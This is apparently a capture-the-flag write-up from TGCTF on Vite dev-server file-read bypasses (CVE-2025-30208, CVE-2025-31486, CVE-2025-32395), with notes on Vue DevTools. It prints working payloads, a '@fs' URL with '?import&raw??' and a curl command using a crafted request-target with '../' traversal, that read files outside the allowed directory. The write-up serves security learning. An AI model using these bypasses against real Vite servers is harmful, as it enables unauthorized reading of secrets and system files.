---
title: "Vite Arbitrary File Read Vulnerability Analysis (CVE-2025-30208 and Others)"
description: "TGCTF front-end challenges: Vite file-access bypasses in CVE-2025-30208, CVE-2025-31486, and CVE-2025-32395, with Vue debugging observations."
date: 2025-06-15T00:00:00.000Z
tags:
  - "CVE-2025-30208"
  - "CVE-2025-31486"
  - "CVE-2025-32395"
  - "vite"
authors:
  - "bx"
draft: false
slug: "bxvite-en"
lang: "en"
translationKey: "bxvite"
---

# Vite Vulnerability Analysis
Three challenges in TGCTF involved this; this vulnerability is quite new.

+ CVE-2025-30208

`@fs` Denies access to files outside the Vite server's allow list. Adding `?raw??` or `?import&raw??` to the URL bypasses this restriction and returns the file contents if the file exists. The bypass works because trailing separators (such as `?`) are removed in multiple places, but are not considered in the query-string regular expression.

[https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w](https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w)

+ CVE-2025-31486

This affects only applications that explicitly expose the Vite development server to the network (using the --host or server.host configuration option).

[`server.fs.deny` bypassed via `.svg` or a relative path](https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x)

+ CVE-2025-32395

[`server.fs.deny` bypassed with an invalid `request-target`](https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4)

## Debugging Vue
I learned about Vue DevTools.

Official site:

[Vue DevTools](https://devtools.vuejs.org/)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744727354800-2928e5dd-2bfa-447c-9bcd-997f324948ee.png)

I'll use this challenge as an example. Download this extension in Chrome.

You can clearly see things such as the structure of a Vue project.

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744727146492-3214e69b-56f6-4658-a38a-3e9b4dd994e3.png)

`components` allows quick debugging. It's much better than spending ages finding things yourself, and it can quickly organize version numbers and project structure too.

The results are as follows:

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744727030500-241e36a6-a6d1-4260-9065-bcd3677282f7.png)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744727200702-a5b0c156-a898-4331-9d5e-cf8981e2e4c7.png)

## **Front-End GAME**
https://www.panziye.com/front/16376.html

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744647088442-4bbde74b-f299-4c85-84da-a8e28caac511.png)

Key code

```bash
const result = (source) => {             if (source > 17) { // <--- 关键条件在这里！                 return `     \u5F53\u524D\u6210\u7EE9\uFF1A${score.value}\u5206     <div class="result">       <img src="@/assets/images/result.png" />       <p>\u606D\u559C\u4F60\u83B7\u5F97\u4E86</p>       <p>\u96EA\u7CD5\u5927\u738B\u79F0\u53F7</p>       <p>flag\u5728\u6839\u76EE\u5F55\u4E0B/tgflagggg\u4E2D</p> // <--- Flag 位置信息！      </div>     `;             } else {                 return `     \u5F53\u524D\u6210\u7EE9\uFF1A${score.value}\u5206     <div class="result">       <img src="@/assets/images/result.png" />       <p>\u83DC\uFF01\uFF01\uFF01</p>     </div>     `;             }         }
   
   
   -------
   
   const result = (source) => {
    if (source > 17) { // <--- 关键条件在这里！
        return `
当前成绩：${score.value}分
<div class="result">
  <img src="@/assets/images/result.png" />
  <p>恭喜你获得了</p>
  <p>雪糕大王称号</p>
  <p>flag在根目录下/tgflagggg中</p> // <--- Flag 位置信息！
</div>
`;
    } else {
        return `
当前成绩：${score.value}分
<div class="result">
  <img src="@/assets/images/result.png" />
  <p>菜！！！</p>
</div>
`;
    }
}
```

http://node2.tgctf.woooo.tech:31048/start.sh

```bash
#!/bin/sh
# 鍚姩 Vite 寮€鍙戞湇鍔″櫒锛堝悗鍙拌繍琛岋級
pnpm dev --host 0.0.0.0 &

echo $FLAG > /tgflagggg
export FLAG="not_flag"
FLAG="not_flag"

httpd -D FOREGROUND

# 淇濇寔瀹瑰櫒杩愯锛堥槻姝㈤€€鍑猴級
tail -f /dev/null
```

The final flag

### Payload
```plain
http://node2.tgctf.woooo.tech:32123/@fs/tgflagggg?import&raw??
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744647088429-b1c1636d-4d47-4d62-b584-12c176821cd1.png)

## **Front-End GAME Plus**
https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x

```bash
const result = (source) => {
            if (source > 17) {
                return `
    \u5F53\u524D\u6210\u7EE9\uFF1A${score.value}\u5206
    <div class="result">
      <p>\u606D\u559C\u4F60\u83B7\u5F97\u4E86</p>
      <p>\u96EA\u7CD5\u5927\u738B\u79F0\u53F7</p>
      <p>flag\u5728\u6839\u76EE\u5F55\u4E0B/tgflagggg\u4E2D</p>
    </div>
    `;
            } else {
                return `
    \u5F53\u524D\u6210\u7EE9\uFF1A${score.value}\u5206
    <div class="result">
      <p>\u83DC\uFF01\uFF01\uFF01</p>
    </div>
```

![](https://cdn.nlark.com/yuque/0/2025/jpeg/42994824/1744647088522-7a5bbeaa-6568-4dc7-b8fa-3599118d4934.jpeg)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744647506078-b8c548b0-fe19-42ad-aca1-76c53f6243ec.png)

Both approaches work.

## **Front-End GAME Ultra**
Reference

https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744647088416-3d7fb5c5-bca7-4254-9d22-b4d6ddb6790f.png)

```plain
┌──(root㉿kali)-[/home/bx]
└─# curl --request-target '/@fs/app/#/../../../tgflagggg' http://node1.tgctf.woooo.tech:32399

TGCTF{3b323bb9-70eb-bb3a-d45a-86aff17f8ef4}
```

